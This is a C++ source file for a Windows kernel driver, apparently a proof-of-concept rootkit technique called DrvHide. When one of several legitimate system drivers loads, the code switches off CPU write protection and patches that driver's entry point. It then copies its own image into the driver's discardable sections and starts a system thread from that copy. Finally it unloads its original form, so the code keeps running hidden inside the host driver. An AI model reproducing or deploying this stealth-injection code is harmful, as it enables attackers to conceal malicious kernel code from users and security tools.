#include "stdafx.h"

#pragma comment(linker,"/MERGE:.rdata=.text") 

PWSTR m_wcKnownDrivers[] = 
{
    L"beep.sys",
    L"ndiswan.sys",
    L"i8042prt.sys",
    L"wanarp.sys"
};

extern "C" POBJECT_TYPE *IoDriverObjectType;

KMUTEX m_GlobalMutex;
UNICODE_STRING m_RegistryPath;
PLDR_DATA_TABLE_ENTRY m_Self = NULL;
BOOLEAN m_bFreeAreaFound = FALSE;
ULONG m_FreeAreaRVA = 0, m_FreeAreaLength = 0, m_RequiredSize = 0;
PVOID m_FreeAreaVA = NULL;

#define EP_PATCH_SIZE 6
UCHAR m_EpOriginalBytes[EP_PATCH_SIZE];
DRIVER_INITIALIZE *m_HookedEntry = NULL;
//--------------------------------------------------------------------------------------
VOID DriverEntryContinueThread(PVOID Param)
{
    LARGE_INTEGER Timeout = { 0 };
    Timeout.QuadPart = RELATIVE(SECONDS(3));    
    
    DbgMsg(__FILE__, __LINE__, "Unloading old driver...\n");

    NTSTATUS ns = ZwUnloadDriver(&m_RegistryPath);
    if (NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "OK\n");
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ZwUnloadDriver() fails; status: 0x%.8x\n", ns);
    }

    while (true)
    {
        DbgPrint(__FUNCTION__"(): I'm allive!\n");

        // sleep
        KeDelayExecutionThread(KernelMode, FALSE, &Timeout);        
    }
}
//--------------------------------------------------------------------------------------
NTSTATUS NewDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    // disable memory write protection
    ForEachProcessor(ClearWp, NULL);

    // restore original code from image entry point
    memcpy(m_HookedEntry, m_EpOriginalBytes, EP_PATCH_SIZE);

    // enable memory write protection
    ForEachProcessor(SetWp, NULL);

    NTSTATUS ns = m_HookedEntry(DriverObject, RegistryPath);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hooked driver returns 0x%.8x\n", ns);
    if (NT_SUCCESS(ns))
    {
        PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
            ((PUCHAR)m_Self->DllBase + ((PIMAGE_DOS_HEADER)m_Self->DllBase)->e_lfanew);

        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
            (pHeaders->FileHeader.SizeOfOptionalHeader + 
            (PUCHAR)&pHeaders->OptionalHeader);

        // disable memory write protection
        ForEachProcessor(ClearWp, NULL);

        // copy driver headers to the founded area
        RtlFillMemory(m_FreeAreaVA, m_FreeAreaLength, 0);
        RtlCopyMemory(m_FreeAreaVA, m_Self->DllBase, pHeaders->OptionalHeader.SizeOfHeaders);

        // copy sections
        for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
        {            
            PVOID DataPtr = (PUCHAR)m_Self->DllBase + pSection->VirtualAddress;

            if (MmIsAddressValid(DataPtr))
            {
                RtlCopyMemory(
                    (PUCHAR)m_FreeAreaVA + pSection->VirtualAddress, 
                    DataPtr,
                    min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
                );
            }                       

            pSection += 1;
        }        

        // reallocate copied image to the new address
        LdrProcessRelocs(
            m_FreeAreaVA, (PVOID)((PUCHAR)pHeaders->OptionalHeader.ImageBase - 
            (PUCHAR)m_Self->DllBase + (PUCHAR)m_FreeAreaVA)
        );

        // enable memory write protection
        ForEachProcessor(SetWp, NULL);

        PKSTART_ROUTINE Start = (PKSTART_ROUTINE)((PUCHAR)DriverEntryContinueThread - 
            (PUCHAR)m_Self->DllBase + (PUCHAR)m_FreeAreaVA);

        // create thread for execution copied driver code
        HANDLE hThread = NULL;
        ns = PsCreateSystemThread(
            &hThread, 
            THREAD_ALL_ACCESS, 
            NULL, NULL, NULL, 
            Start, 
            NULL
        );
        if (NT_SUCCESS(ns))
        {
            ZwClose(hThread);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "PsCreateSystemThread() fails; status: 0x%.8x\n", ns);
        }

        // don't allow to unload target driver
        DriverObject->DriverUnload = NULL;
    }

    return ns;
}
//--------------------------------------------------------------------------------------
void HookImageEntry(PVOID Image)
{
    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PUCHAR Entry = (PUCHAR)RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);

    // save original code from image entry point
    memcpy(m_EpOriginalBytes, Entry, EP_PATCH_SIZE);
    m_HookedEntry = (DRIVER_INITIALIZE *)Entry;

    // disable memory write protection
    ForEachProcessor(ClearWp, NULL);

    // patch image entry point
    *(PUCHAR)(Entry + 0) = 0x68;
    *(PVOID*)(Entry + 1) = NewDriverEntry;
    *(PUCHAR)(Entry + 5) = 0xC3;

    // enable memory write protection
    ForEachProcessor(SetWp, NULL);

    DbgMsg(
        __FILE__, __LINE__, 
        __FUNCTION__"(): Image entry point hooked ("IFMT" -> "IFMT")\n",
        Entry, NewDriverEntry
    );
}
//--------------------------------------------------------------------------------------
BOOLEAN CheckForFreeArea(PVOID Image, PULONG FreeAreaRVA, PULONG FreeAreaLength)
{
    *FreeAreaRVA = NULL;
    *FreeAreaLength = 0;

    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)
        ((PUCHAR)Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        (pHeaders->FileHeader.SizeOfOptionalHeader + 
        (PUCHAR)&pHeaders->OptionalHeader);

    ULONG AreaRVA = NULL;
    ULONG AreaLength = 0;

    // enumerate image sections
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
    {            
        PVOID SectionVa = RVATOVA(Image, pSection->VirtualAddress);
        char szSectionName[IMAGE_SIZEOF_SHORT_NAME + 1];
        RtlZeroMemory(szSectionName, sizeof(szSectionName));
        RtlCopyMemory(szSectionName, &pSection->Name, IMAGE_SIZEOF_SHORT_NAME);

        // print section information
        DbgMsg(
            __FILE__, __LINE__, "%8s: "IFMT", %8d bytes %s\n", 
            szSectionName, SectionVa, pSection->Misc.VirtualSize,
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)?"Discardabe":""
        );

        // check for discardable attribute
        if ((pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) &&
            strcmp(szSectionName, "INIT"))
        {            
            if (AreaRVA && pSection->VirtualAddress == AreaRVA + AreaLength)
            {
                // concatenate with the previously found section
                AreaLength += XALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
            }
            else
            {
                AreaRVA = pSection->VirtualAddress;
                AreaLength = XALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
            }            
        }

        pSection += 1;
    }

    DbgMsg(
        __FILE__, __LINE__, 
        "%d bytes of the free space has been found at RVA 0x%.8x\n", 
        AreaLength, AreaRVA
    );

    // check if our driver can be stored in the found space
    if (AreaLength >= m_RequiredSize &&
        pHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        *FreeAreaRVA = AreaRVA;
        *FreeAreaLength = AreaLength;

        pSection = (PIMAGE_SECTION_HEADER)
            (pHeaders->FileHeader.SizeOfOptionalHeader + 
            (PUCHAR)&pHeaders->OptionalHeader);

        // erase discardable flag
        for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
        {
            pSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
            pSection += 1;
        }
        
        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
inline wchar_t chrlwr_w(wchar_t chr)
{
    if ((chr >= 'A') && (chr <= 'Z')) 
    {
        return chr + ('a'-'A');
    }

    return chr;
}
//--------------------------------------------------------------------------------------
BOOLEAN IsKnownDriver(PUNICODE_STRING usName)
{
    // enumerate known modules
    for (size_t i = 0; i < sizeof(m_wcKnownDrivers) / sizeof(PWSTR); i++)
    {
        PWSTR wcName_1 = m_wcKnownDrivers[i], wcName_2 = usName->Buffer;
        size_t Len_1 = wcslen(wcName_1);
        size_t Len_2 = usName->Length / sizeof(wchar_t);

        if (Len_1 > Len_2)
        {
            goto next;
        }

        // match image path from the end
        for (size_t n = 1; n < Len_1; n++)
        {
            if (wcName_1[Len_1 - n] != chrlwr_w(wcName_2[Len_2 - n]))
            {
                goto next;
            }
        }

        return TRUE;

next:
        continue;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
/*
kd> kb
ChildEBP RetAddr  Args to Child              
f8afdaa8 805c62ae f8afdcf0 00000000 f8afdb44 DrvHide!LoadImageNotify+0x10
f8afdac8 805a4159 f8afdcf0 00000000 f8afdb44 nt!PsCallImageNotifyRoutines+0x36
f8afdc6c 80576483 f8afdcf0 00000000 00000000 nt!MmLoadSystemImage+0x9e5
f8afdd4c 8057688f 80000378 00000001 00000000 nt!IopLoadDriver+0x371
f8afdd74 80534c02 80000378 00000000 823c63c8 nt!IopLoadUnloadDriver+0x45
f8afddac 805c6160 b286ecf4 00000000 00000000 nt!ExpWorkerThread+0x100
f8afdddc 80541dd2 80534b02 00000001 00000000 nt!PspSystemThreadStartup+0x34
00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x16
*/
VOID LoadImageNotify(
   PUNICODE_STRING FullImageName,
   HANDLE ProcessId, // where image is mapped
   PIMAGE_INFO ImageInfo)
{
    KeWaitForMutexObject(&m_GlobalMutex, Executive, KernelMode, FALSE, NULL);

    // check for kernel driver
    if (ProcessId == 0 && ImageInfo->SystemModeImage && !m_bFreeAreaFound &&
        IsKnownDriver(FullImageName))
    {
        PVOID TargetImageBase = ImageInfo->ImageBase;
        ULONG TargetImageSize = ImageInfo->ImageSize;

        DbgMsg(
            __FILE__, __LINE__, "%d '%wZ' is at "IFMT", size: %d\n", 
            PsGetCurrentProcessId(), FullImageName, TargetImageBase, TargetImageSize
        );
        
        // check for free area at the image discardable sections
        if (m_bFreeAreaFound = CheckForFreeArea(TargetImageBase, &m_FreeAreaRVA, &m_FreeAreaLength))        
        {
            m_FreeAreaVA = RVATOVA(TargetImageBase, m_FreeAreaRVA);

            DbgMsg(__FILE__, __LINE__, "Free area found!\n");

            // hook image entry point
            HookImageEntry(TargetImageBase);
        }
    }

    KeReleaseMutex(&m_GlobalMutex, FALSE);
}
//--------------------------------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject)
{   
    DbgMsg(__FILE__, __LINE__, "DriverUnload()\n");    

    PsRemoveLoadImageNotifyRoutine(LoadImageNotify);
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{    
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\n");  

    DriverObject->DriverUnload = DriverUnload;
    m_Self = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

    KeInitializeMutex(&m_GlobalMutex, NULL); 

    // save registry path
    if (AllocUnicodeString(&m_RegistryPath, RegistryPath->Length))
    {
        RtlCopyUnicodeString(&m_RegistryPath, RegistryPath);
        DbgMsg(__FILE__, __LINE__, "Service registry path is '%wZ'\n", &m_RegistryPath);
    }
    else
    {
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS ns = PsSetLoadImageNotifyRoutine(LoadImageNotify);
    if (!NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "PsSetLoadImageNotifyRoutine() fails; status: 0x%.8x\n", ns);
        return STATUS_UNSUCCESSFUL;
    }

    PIMAGE_NT_HEADERS32 pHeaders = (PIMAGE_NT_HEADERS32)((PUCHAR)m_Self->DllBase + 
        ((PIMAGE_DOS_HEADER)m_Self->DllBase)->e_lfanew);

    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
        (pHeaders->FileHeader.SizeOfOptionalHeader + 
        (PUCHAR)&pHeaders->OptionalHeader);
    
    // copy sections
    for (ULONG i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
    {            
        // erase discardable flag from our driver sections
        pSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;             
        pSection += 1;
    } 

    m_RequiredSize = pHeaders->OptionalHeader.SizeOfImage;

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
